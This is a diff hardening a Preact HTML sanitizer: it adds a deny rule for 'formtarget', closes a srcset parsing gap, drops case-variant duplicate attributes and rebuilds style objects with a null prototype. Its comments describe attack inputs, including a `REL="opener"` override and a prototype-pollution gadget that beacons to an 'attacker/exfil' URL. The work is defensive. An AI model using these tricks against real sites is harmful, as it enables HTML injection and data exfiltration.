@@ -303,7 +303,14 @@ const HARD_DENY_ATTRS = new Set([
 	'attributionsrc',
 	'inert',
 	'nonce',
-	'is'
+	'is',
+	// `formtarget` is `target` for form submissions: same browsing-
+	// context-escape attack class (`_top` / `_parent` breaks iframe
+	// sandbox, `_blank` leaks `window.opener` to the submission tab).
+	// The `target`-branch noopener injection in the sanitizer does
+	// nothing for `<form>` submissions in older browsers, so just
+	// refuse opt-in entirely.
+	'formtarget'
 ]);
 
 function isHardDeniedAttr(lower) {
@@ -358,6 +365,15 @@ function sanitizeUrl(value, attr) {
 // secondary URLs straight through — the browser fires requests to
 // each. Returns the original string if every URL in the list passes
 // individually, null if any fails.
+//
+// For `srcset`, the data:image fast-path is INTENTIONALLY DISABLED.
+// `srcset="data:image/png;base64,/safe 1x"` would split on `,` into
+// two candidates that each individually pass `sanitizeUrl` — but the
+// browser's srcset parser keeps the comma as part of the data URL.
+// The sanitizer's "two candidates" view doesn't match the browser's
+// "one candidate" view, and the mismatch is the wrong shape of
+// defense. data: URLs in srcset are uncommon and not supported by the
+// WHATWG spec; require all srcset URLs to match `SAFE_URL_RE`.
 function sanitizeUrlList(value, attr) {
 	if (typeof value !== 'string') return null;
 	// `srcset`: comma-separated candidate strings. For each, the URL
@@ -365,11 +381,14 @@ function sanitizeUrlList(value, attr) {
 	// descriptor (e.g. `2x`, `300w`).
 	// `ping`: space-separated URL list.
 	const parts = attr === 'srcset' ? value.split(',') : value.split(/\s+/);
+	// Pass a sentinel attr for srcset so `sanitizeUrl` does NOT take
+	// the `src`/`poster` data:image branch.
+	const perItemAttr = attr === 'srcset' ? 'srcset' : attr;
 	for (let i = 0; i < parts.length; i++) {
 		const part = parts[i].trim();
 		if (part === '') continue; // tolerate empty entries from extra whitespace/commas
 		const url = attr === 'srcset' ? part.split(/\s+/)[0] : part;
-		if (sanitizeUrl(url, attr === 'srcset' ? 'src' : attr) == null) {
+		if (sanitizeUrl(url, perItemAttr) == null) {
 			return null;
 		}
 	}
@@ -572,17 +591,33 @@ let installed = false;
 // every newly created vnode is sanitized.
 let secureRenderDepth = 0;
 
-// How deep we are specifically inside a `SecureBoundary`-rooted
-// subtree (i.e. one that originated from a `secureRender` call). This
-// is DISTINCT from `secureRenderDepth` because secure-reentry
-// boundaries (e.g. `confineComponent` wrappers via
-// `_registerSecureReentryType`) also bump `secureRenderDepth` —
-// even when no SecureBoundary is on the stack. Sibling addons use
-// `_isInSecureContext()` to detect "am I REALLY rendering inside a
-// secureRender tree", and we don't want a secure-reentry self-
-// bracket to give the answer "yes" when the host actually mounted
-// the addon under plain `preact/render`.
-let secureBoundaryDepth = 0;
+/**
+ * Walk a vnode's ancestor chain looking for a `SecureBoundary`
+ * mount. SecureBoundary is module-private, so its identity cannot be
+ * forged from outside this module — finding it on the chain is a
+ * tight assertion that the vnode is rendering inside a real
+ * `secureRender` subtree.
+ *
+ * Used by the secure-reentry branch as a fail-fast: when a sibling
+ * addon's wrapper (e.g. `preact/compartment` Confined) is rendered
+ * outside any secure tree, this returns false and the reentry branch
+ * throws BEFORE the wrapper body runs.
+ *
+ * Replaces an earlier counter-based design (`secureBoundaryDepth`)
+ * that round-4 review showed was brittle: any sibling addon that
+ * swallowed `options._catchError` (notably Suspense in
+ * `preact/compat`) could leave the counter permanently elevated, at
+ * which point every subsequent free-floating Confined falsely
+ * self-certified. An ancestor walk has no global mutable state.
+ */
+function hasSecureBoundaryAncestor(vnode) {
+	let p = vnode && vnode._parent;
+	while (p) {
+		if (p.type === SecureBoundary) return true;
+		p = p._parent;
+	}
+	return false;
+}
 
 // How deep we are inside a SecureExit's render call(s). When > 0, the
 // sanitizer no-ops and `_secureCtx` does not propagate, so descendants
@@ -690,6 +725,24 @@ function install() {
 			secureReentryTypes.has(vnode.type) &&
 			!vnode._secureBracketed
 		) {
+			// FAIL-FAST: walk the vnode's ancestor chain looking for a
+			// SecureBoundary that was mounted via `secureRender`. If
+			// absent, the host has rendered this secure-reentry
+			// component (Confined / equivalent) outside any secure
+			// tree — which would otherwise silently bypass every
+			// allow-by-default attribute defense and expose the host
+			// to HTML injection. Refuse to render rather than degrade
+			// quietly.
+			if (!hasSecureBoundaryAncestor(vnode)) {
+				throw new Error(
+					'preact/secure: a secure-reentry component (e.g. ' +
+						'preact/compartment Confined) must be rendered inside a ' +
+						'`secureRender` tree. Mount the host root via ' +
+						'`secureRender(...)` from `preact/secure` — calling Preact ' +
+						'`render` directly with such a component is unsupported and ' +
+						'exposes the host to HTML injection.'
+				);
+			}
 			vnode._secureBracketed = true;
 			vnode._secureCtx = true;
 			// Save the trusted-exit depth and reset it for this subtree
@@ -708,27 +761,6 @@ function install() {
 			vnode._secureSafeAttrs = attrs;
 			pushAllowed(tags, attrs);
 			secureRenderDepth++;
-			// `_isInSecureContext()` must return true for sibling
-			// addons (the very thing the reentry branch exists to
-			// support) when the secure-reentry vnode is rendering
-			// inside a real `secureRender` subtree. Detection is by
-			// PARENT identity: the boundary branch (below) stamps
-			// `_secureCtx` on every vnode it brackets, including the
-			// SecureBoundary itself, and Preact's diff sets
-			// `vnode._parent` to the parent vnode by the time
-			// `options._render` fires here. A setState-driven
-			// re-render reuses the same vnode object — so
-			// `_parent._secureCtx` survives across re-renders without
-			// needing the SecureBoundary's `_render` to re-fire.
-			//
-			// For a Confined rendered via plain `preact/render`,
-			// `vnode._parent` points at the wrapping Fragment whose
-			// `_secureCtx` was never set — the bump does not happen
-			// and the fail-fast in the addon's render fires.
-			if (vnode._parent && vnode._parent._secureCtx === true) {
-				vnode._secureBoundaryBracketed = true;
-				secureBoundaryDepth++;
-			}
 		}
 		// Trusted-exit boundary: enter a trusted island, suppress secure
 		// bookkeeping for the subtree. Membership is by IDENTITY against
@@ -760,16 +792,6 @@ function install() {
 		) {
 			vnode._secureCtx = true;
 			vnode._secureBracketed = true;
-			// Mark this vnode as a SecureBoundary-tree bracket (NOT a
-			// secure-reentry bracket). `_isInSecureContext` consults
-			// `secureBoundaryDepth` to decide whether a sibling addon
-			// (e.g. `confineComponent`) is rendering inside a real
-			// `secureRender` subtree; reentry brackets must NOT bump
-			// that counter, otherwise a Confined mounted via plain
-			// `preact/render` would self-certify as "in secure
-			// context".
-			vnode._secureBoundaryBracketed = true;
-			secureBoundaryDepth++;
 			// Resolve and push the allowlists for the duration of this
 			// component's render. The boundary props carry the per-tree
 			// allowlists; descendants inherit via their parent's cached
@@ -811,10 +833,6 @@ function install() {
 				vnode._savedTrustedExitDepth = undefined;
 			}
 		}
-		if (vnode._secureBoundaryBracketed) {
-			vnode._secureBoundaryBracketed = false;
-			secureBoundaryDepth--;
-		}
 		if (vnode._trustedExitBracketed) {
 			vnode._trustedExitBracketed = false;
 			trustedExitDepth--;
@@ -837,10 +855,6 @@ function install() {
 					trustedExitDepth = vnode._savedTrustedExitDepth;
 					vnode._savedTrustedExitDepth = undefined;
 				}
-			}
-			if (vnode._secureBoundaryBracketed) {
-				vnode._secureBoundaryBracketed = false;
-				secureBoundaryDepth--;
 			}
 			if (vnode._trustedExitBracketed) {
 				vnode._trustedExitBracketed = false;
@@ -919,6 +933,19 @@ function sanitizeVNode(vnode, allowedTags, safeAttrs) {
 // `for...in` walks no inherited keys.
 function sanitizeElementProps(props, safeAttrs) {
 	const out = Object.create(null);
+	// Track which lowercased attrs have already been admitted, and
+	// under what casing. Two purposes:
+	//   1. Reject case-variant duplicates — `<a rel="" target="_blank"
+	//      REL="opener">` would otherwise leave both `out.rel` and
+	//      `out.REL` set; the post-pass that forces rel="noopener
+	//      noreferrer" only writes the lowercase slot, and Preact's
+	//      diff iterates both, with the browser's case-insensitive
+	//      setAttribute resolving to "whichever was iterated last".
+	//      First-occurrence-wins keeps the loop deterministic.
+	//   2. Tell the noopener post-pass which casing the prior `rel`
+	//      was admitted under, so it can delete that slot before
+	//      writing the canonical `rel`.
+	const admittedKeyByLower = Object.create(null);
 	let forceNoopener = false;
 	const keys = Object.getOwnPropertyNames(props);
 	for (let i = 0; i < keys.length; i++) {
@@ -958,6 +985,16 @@ function sanitizeElementProps(props, safeAttrs) {
 				if (key[0] !== 'o' || key[1] !== 'n') continue;
 				if (value == null) continue;
 				if (typeof value !== 'function') continue;
+				// Preact's `setProperty` (`src/diff/props.js`) does
+				// `name.slice(2).toLowerCase()` to derive the event name,
+				// so `onClick` and `onclick` BOTH register on the same
+				// `_listeners['click...']` slot. Two admissions would
+				// leave the last-iterated one winning; we drop the second
+				// so the wrapped handler can't be displaced by an
+				// attacker-shaped duplicate.
+				const onLower = key.toLowerCase();
+				if (admittedKeyByLower[onLower] !== undefined) continue;
+				admittedKeyByLower[onLower] = key;
 				out[key] = wrapListener(value);
 				continue;
 			}
@@ -973,32 +1010,81 @@ function sanitizeElementProps(props, safeAttrs) {
 			lower.length > 5 &&
 			(lower.indexOf('aria-') === 0 || lower.indexOf('data-') === 0)
 		) {
+			if (admittedKeyByLower[lower] !== undefined) continue;
+			admittedKeyByLower[lower] = key;
 			out[key] = value;
 			continue;
 		}
 
 		// ALLOWLIST GATE — drop anything not explicitly admitted.
 		if (!safeAttrs.has(lower)) continue;
+		// Duplicate case-variant of an already-admitted attr — drop
+		// the second occurrence. See `admittedKeyByLower` comment.
+		if (admittedKeyByLower[lower] !== undefined) continue;
 
 		// URL value sanitization. Multi-URL attrs (`ping`, `srcset`)
 		// route through a list-aware sanitizer; everything else uses
 		// the single-value path.
 		if (lower === 'ping' || lower === 'srcset') {
 			if (value == null) {
+				admittedKeyByLower[lower] = key;
 				out[key] = value;
 				continue;
 			}
 			const sanitized = sanitizeUrlList(value, lower);
-			if (sanitized != null) out[key] = sanitized;
+			if (sanitized != null) {
+				admittedKeyByLower[lower] = key;
+				out[key] = sanitized;
+			}
 			continue;
 		}
 		if (URL_ATTRS.has(lower)) {
 			if (value == null) {
+				admittedKeyByLower[lower] = key;
 				out[key] = value;
 				continue;
 			}
 			const sanitized = sanitizeUrl(value, lower);
-			if (sanitized != null) out[key] = sanitized;
+			if (sanitized != null) {
+				admittedKeyByLower[lower] = key;
+				out[key] = sanitized;
+			}
+			continue;
+		}
+
+		// `style` is admitted as an arbitrary object. Preact's
+		// `setProperty` (`src/diff/props.js` line 57) iterates style
+		// values with `for (name in value)` — which walks the
+		// prototype chain. A pollution gadget setting
+		// `Object.prototype.backgroundImage = 'url(https://attacker/
+		// exfil?…)'` would then leak into every styled element on the
+		// secure tree (cookie / referrer beacon via CSS fetch). Rebuild
+		// the style object with a NULL prototype so the inheritance
+		// channel is closed.
+		//
+		// IMPORTANT: read each entry via Object.getOwnPropertyDescriptor
+		// rather than `value[sk]` — accessor properties on the
+		// attacker's style would otherwise fire during this rebuild.
+		// (`options.vnode` runs while the attacker's `endowments.h`
+		// call is still in flight, BEFORE the compartment's coercer
+		// has a chance to substitute its descriptor-only `shallowDataCopy`
+		// version. Skipping accessors here mirrors that defense.)
+		if (lower === 'style' && value !== null && typeof value === 'object') {
+			const styleOut = Object.create(null);
+			const styleKeys = Object.getOwnPropertyNames(value);
+			for (let j = 0; j < styleKeys.length; j++) {
+				const sk = styleKeys[j];
+				let desc;
+				try {
+					desc = Object.getOwnPropertyDescriptor(value, sk);
+				} catch (_) {
+					continue;
+				}
+				if (desc && 'value' in desc) styleOut[sk] = desc.value;
+				// accessor descriptors (with `get`/`set`) are skipped
+			}
+			admittedKeyByLower[lower] = key;
+			out[key] = styleOut;
 			continue;
 		}
 
@@ -1011,8 +1097,11 @@ function sanitizeElementProps(props, safeAttrs) {
 		// Default allowlist omits `target`, so this branch is
 		// dormant unless the host knowingly opted in.
 		if (lower === 'target') {
-			if (value === '_self') out[key] = value;
-			else if (value === '_blank') {
+			if (value === '_self') {
+				admittedKeyByLower[lower] = key;
+				out[key] = value;
+			} else if (value === '_blank') {
+				admittedKeyByLower[lower] = key;
 				out[key] = value;
 				forceNoopener = true;
 			}
@@ -1020,13 +1109,27 @@ function sanitizeElementProps(props, safeAttrs) {
 			continue;
 		}
 
+		admittedKeyByLower[lower] = key;
 		out[key] = value;
 	}
 	if (forceNoopener) {
-		// Hard-set rather than merge — preserving attacker-controlled
-		// `rel` tokens isn't worth the parsing complexity. Loses
-		// benign annotations like `rel="external"` on `_blank` links
-		// inside a confined subtree; acceptable trade-off.
+		// Delete whatever casing of `rel` (if any) was admitted
+		// earlier in the loop, then hard-set the canonical lowercase
+		// `rel`. Without the delete, an attacker could pass
+		// `<a target="_blank" REL="opener">` — the loop admits
+		// `out.REL = 'opener'`, this post-pass writes `out.rel =
+		// 'noopener noreferrer'`, and the browser's case-insensitive
+		// setAttribute pass applies both, with the attacker's casing
+		// winning the last-write-wins race in Preact's iteration
+		// order. Hard-set rather than merge — preserving
+		// attacker-controlled `rel` tokens isn't worth the parsing
+		// complexity. Loses benign annotations like `rel="external"`
+		// on `_blank` links inside a confined subtree; acceptable
+		// trade-off.
+		const existingRelKey = admittedKeyByLower['rel'];
+		if (existingRelKey !== undefined && existingRelKey !== 'rel') {
+			delete out[existingRelKey];
+		}
 		out.rel = 'noopener noreferrer';
 	}
 	return out;
@@ -1144,23 +1247,6 @@ export function secureRender(vnode, parentDom, opts) {
 /** Tear down a secure tree. */
 export function unmount(parentDom) {
 	preactRender(null, parentDom);
-}
-
-/**
- * Returns true if the current synchronous frame is rendering inside
- * a `secureRender` subtree — used by sibling addons (e.g.
- * `preact/compartment`) to refuse to render when the host has not
- * mounted them under `secureRender`.
- *
- * SECURITY: this is a fail-fast knob, not a security boundary. A
- * `true` return only means a SecureBoundary or secure-reentry
- * bracket is currently on the stack; it does NOT certify that the
- * call site itself is inside that subtree. The intended caller is
- * the render function of a sibling addon — callers Preact has
- * already routed into the secure render flow.
- */
-export function _isInSecureContext() {
-	return secureBoundaryDepth > 0;
 }
 
 export { h, Fragment, createElement } from 'preact';
